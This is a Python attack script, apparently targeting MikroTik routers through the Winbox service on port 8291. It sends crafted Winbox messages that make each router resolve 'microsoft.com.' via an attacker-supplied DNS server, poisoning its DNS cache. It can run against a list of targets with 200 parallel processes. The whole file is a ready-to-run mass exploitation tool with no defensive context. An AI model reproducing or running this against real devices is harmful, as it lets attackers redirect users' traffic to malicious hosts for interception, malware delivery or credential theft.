#!/usr/bin/env python3

import argparse, struct, time
from multiprocessing import Pool
from socket import *

# https://github.com/jabberd/winbox
from winbox.tcpsession import *
from winbox.message import *
from winbox.packet import *

# Global variables
targets = []
number_of_threads = 200
winbox_port = 8291
dns_port = 53
poison_hostname = b'microsoft.com.'
connect_timeout = 5

def ip2dword(addr):
        return struct.unpack("<I", inet_aton(addr))[0]

# Poison the DNS cache
def dns_poison(target):
	print('[*] Connecting to %s:%s' % (target, winbox_port))
	session = mtTCPSession(target, port = winbox_port, timeout = connect_timeout)
	try:
		session.connect()
		time.sleep(0.5)
	except:
		print('[-] TCP Session start error to %s' % target)
		return
	try:
		msg = mtMessage()
		msg.set_to(14)
		msg.set_request_id(1)
		msg.set_command(3)
		msg.set_reply_expected(False)
		msg.add_string(3, poison_hostname)
		msg.add_u32(1, ip2dword(dns_server))
		msg.add_u32(2, int(dns_port))
		pkt = mtPacket(msg.build())
		#msg.dump()
		session.send(pkt)
		session.close()
	except:
		print('[-] Session data send error to %s' % target)

def read_targets(filename):
	try:
		with open(filename) as f:
			targets = [t.strip() for t in f.readlines()]
		f.close()
		return targets
	except:
		return None

def parse_args():
	parser = argparse.ArgumentParser(description='description')
	parser.add_argument('-t', '--target', help = 'Single target hostname', required = False)
	parser.add_argument('-T', '--targets', help = 'Targets list filename', required = False)
	parser.add_argument('--dns-server', help = 'DNS server host', required = True)
	parser.add_argument('--dns-port', type = int, help = 'DNS server port', required = False)
	parser.add_argument('-n', '--threads', type = int, help = 'Number of threads for parallel processing', required = False)
	parser.add_argument('-p', '--port', type = int, help = 'Winbox port number', required = False)
	return vars(parser.parse_args())

if __name__ == '__main__':
	args = parse_args()

	if not (args['target'] or args['targets']):
		print('Please specify --target/-t <hostname> or --targets/-T <filename> to scan')
		exit(1)

	if args['threads']:
		number_of_threads = args['threads']

	if args['port']:
		winbox_port = args['port']

	if args['dns_port']:
		dns_port = args['dns_port']

	if args['dns_server']:
		dns_server = args['dns_server']

	if args['target'] and args['targets']:
		print('Please specify either --target/-t <hostname>, or --targets/-T <filename>, but not both')
		exit(1)
	elif args['target']:
		targets.append(args['target'])
		number_of_threads = 1
	else:
		targetsfile = args['targets']
		targets = read_targets(targetsfile)
		if targets is None:
			print('Error reading the targets file: %s' % targetsfile)
			exit(1)
		targets_count = len(targets)
		if targets_count < number_of_threads:
			number_of_threads = targets_count

	print('DNS Server to resolve: %s:%s' % (dns_server, dns_port))
	print('[*] Starting with %s threads' % number_of_threads)
	pool = Pool(processes = int(number_of_threads))
	results = pool.map(dns_poison, targets)
	pool.close()
	pool.join()
	print('[!] Finishing...')
